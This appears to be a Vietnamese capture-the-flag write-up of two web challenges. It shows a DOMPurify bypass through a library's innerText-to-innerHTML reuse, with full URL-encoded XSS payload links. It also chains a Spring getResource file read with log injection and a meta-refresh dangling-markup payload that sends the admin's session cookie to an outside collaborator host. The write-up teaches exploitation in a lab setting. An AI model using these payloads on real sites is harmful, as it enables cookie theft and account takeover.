## Peanut XSS
Như cái tên và description, ta cần tìm cách khai thác được XSS và lấy được cookie của user

Bài này dựa vào những dòng inline script đầu tiên ta nhận thấy input duy nhất được đưa vào hàm `DOMPurify.sanitize`, việc đầu tiên nghĩ đến sẽ là tìm cách bypass DOMPurify, tuy nhiên DOMPurify sử dụng cơ chế không dễ ăn tí nào, bằng cách dựa vào chính DOM tree để loại bỏ các tag và attribute không mong muốn.

Nhìn vào quá khứ đã từng có một số lỗ hổng như MXSS khiến cho việc bypass DOMPurify trở nên khả thi, vậy ta sẽ tìm version hiện tại của nó trước. Bằng cách vào chrome devtool ta thấy được version là 2.3.6, có vẻ không có cve đã biết nào, nhưng version cũng không phải latest, không lẽ là 0day?

![](https://hackmd.io/_uploads/BkRgzUgYh.png)

Nhìn qua sẽ không thấy lib DOMPurify được load vào ở giao diện chính, điều tra vào thư viện Nutshell sẽ thấy minified  DOMPurify script được kèm ở trong thư viện này luôn, khả năng ta sẽ dựa vào thư viện này để bypass qua DOMPurify

Sau một thời gian audit mình thấy dòng 
```javascript
linkText.innerHTML = ex.innerText.slice(ex.innerText.indexOf(':')+1);
```
`linktext` lát sau được đưa vào DOM tree ở dòng
```javascript
ex.appendChild(linkText);
```

Context của đoạn code này là thư viện Nutshell sẽ tìm tất cả các tag `a`, check xem nếu trong innerText có vị trí đầu tiên là `:` thì nó sẽ trở thành một `expandable`, đại khái là khi click vô cái tag `a` đó thì nó sẽ drop down xuống một cái bong bóng chứa nội dung abc gì đó

### innerText and innerHTML

Nhắc lại cách hoạt động của DOMPurify, dựa vào DOM tree để loại các node và attribute không mong muốn, đối với một cặp thẻ `<p></p>` thì có thể gọi là node p, với một dòng text đơn thuần thì sẽ được gọi là text node, khác biệt ở đâu?

Ví dụ ta có data `<a><h1>aaaa</h1></a>`, nếu gọi đến innerHTML của thẻ `a` thì data thu được sẽ là `<h1>aaaa</h1>`, nếu gọi đến innerText thì kết quả thu được là `aaaa`

Nhìn lại đoạn code gán `linkText.innerHTML` phía trên, ta có thể thấy rằng nếu ta có thể chèn các tag html như tag script vào innerText thì lát nữa khi được gán cho innerHTMl của linkText và insert vào DOM tree thì ta sẽ bypass qua được DOMPurify.

Vấn đề là nếu ta dùng một payload dạng `<h1><script></script></h1>` thì script vẫn bị nhận là 1 thẻ html và lát nữa vào DOMPurify sẽ bị lọc, vậy làm sao để đoạn payload của ta được xem là 1 text node? Ta sẽ encode nó thành html entity, lát nữa khi đi qua innerText nó sẽ decode các html entity về lại plain text 

```u!
https://peanut-xss-web.chal.uiuc.tf/?nutshell=%3Ca+href=%27x%27%3E:a%3Ch1%3E%26%2360%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2362%26%2397%26%23108%26%23101%26%23114%26%23116%26%2340%26%2341%26%2360%26%2347%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2362%3C/h1%3E%3C/a%3E
```

Phải url encode vì html entity có chứa ký tự `&`, sẽ bị nhầm thành url parameter delimiter

Tuy nhiên nó vẫn không chạy, dù f12 đã thấy có thẻ script được chèn vào DOM, vấn đề ở đâu nhỉ?
![](https://hackmd.io/_uploads/ryL_ULlKh.png)

Đó là vì sau khi DOM được load lần đầu tiên, mọi hành động insert vào sau này sẽ không làm reload lại DOM, dẫn đến content bên trong thẻ script sẽ không chạy. Vậy thì cứ dùng payload img onerror kinh điển thôi :v 

```a!
https://peanut-xss-web.chal.uiuc.tf/?nutshell=%3Ca+href=%27x%27%3E:a%3Ch1%3E%26%2360%26%23105%26%23109%26%23103%26%2332%26%23115%26%23114%26%2399%26%2361%26%23120%26%2332%26%23111%26%23110%26%23101%26%23114%26%23114%26%23111%26%23114%26%2361%26%2397%26%23108%26%23101%26%23114%26%23116%26%2340%26%2334%26%2349%26%2334%26%2341%26%2332%26%2347%26%2362%3C/h1%3E%3C/a%3E
```

![](https://hackmd.io/_uploads/HJ3fYUgth.png)

XSS được rồi thì đoạn viết script lấy cookie sẽ đơn giản thôi

## Adminplz
Bài này là một bài java, sử dụng framework spring, flag nằm ở file flag.html trong thư mục root.

![](https://hackmd.io/_uploads/BJ9spIeF3.png)

Nhìn vào code ta sẽ thấy tại route `/admin`, input của ta lấy từ param `view` sẽ được đưa vào hàm getResource, mục đích của hàm này là tìm và trả về một file và định dạng input có thể truyền vào cũng khá đa dạng, mình sẽ tóm tắt như sau:
- Nếu input có `classpath:` đằng trước thì spring sẽ tìm file này trong các classpath
- Nếu input có `http://` hoặc `https://` đằng trước thì sẽ gửi HTTP request tới resource để fetch nội dung về
- Nếu input có prefix là `file://` thì sẽ fetch file từ file system

Vậy đây có thể xem như một lỗ hổng SSRF, ta có thể đọc mọi file trên server và làm cho nó hiện thị, nhưng vấn đề là chỉ có admin đọc được nội dung này, và file flag cũng chỉ admin đọc được. Vậy ta có thể liên kết 2 việc này lại và đoán rằng có vẻ đây lại là 1 bài client side khác, tuy nhiên CSP lại rất strict và có lẽ ta sẽ không thể bypass qua được

Để ý một chi tiết đó là mọi truy cập authenticated nếu request đến với `view` chứa từ `flag` đều được ghi log lại, và log nằm ở `/var/log/adminplz/latest.log`, ta thấy định dạng được ghi vào gồm có username và sessionid (cookie) của user đó. Kết hợp với dữ kiện username mà ta nhập vào không được sanitize mà ghi thẳng vào log, ta sẽ có gì?

Ta có thể lợi dụng thẻ meta redirect (bypass qua CSP), kết hợp với dangling markup để điều hướng admin đến burp collaborator (hoặc 1 server nào đó mà ta control) để lấy cookie và login vào để đọc flag

Flow sẽ như sau:
- Gửi request với username là `<meta http-equiv="refresh" content="2; url=http://a4fxg7twfvweqw27hr6f6imscjia62ur.oastify.com/?a=` rồi truy cập vào `/admin?view=flag` để payload của ta được ghi vào log
- Đưa url của endpoint `/admin?view=flag"/>` cho admin truy cập để ghi cookie của admin vào log và đóng double quote của dangling markup lại
- Cuối cùng là gửi cho admin endpoint`/admin?view=file:///var/log/adminplz/latest.log` để admin đọc file này và redirect đến server của ta

Khoảng chờ giữa 2 lần con bot admin truy cập sẽ là 5 phút, vì con bot sau khi access sẽ bắt chờ 5 phút

![](https://hackmd.io/_uploads/B1Pygvgt2.png)
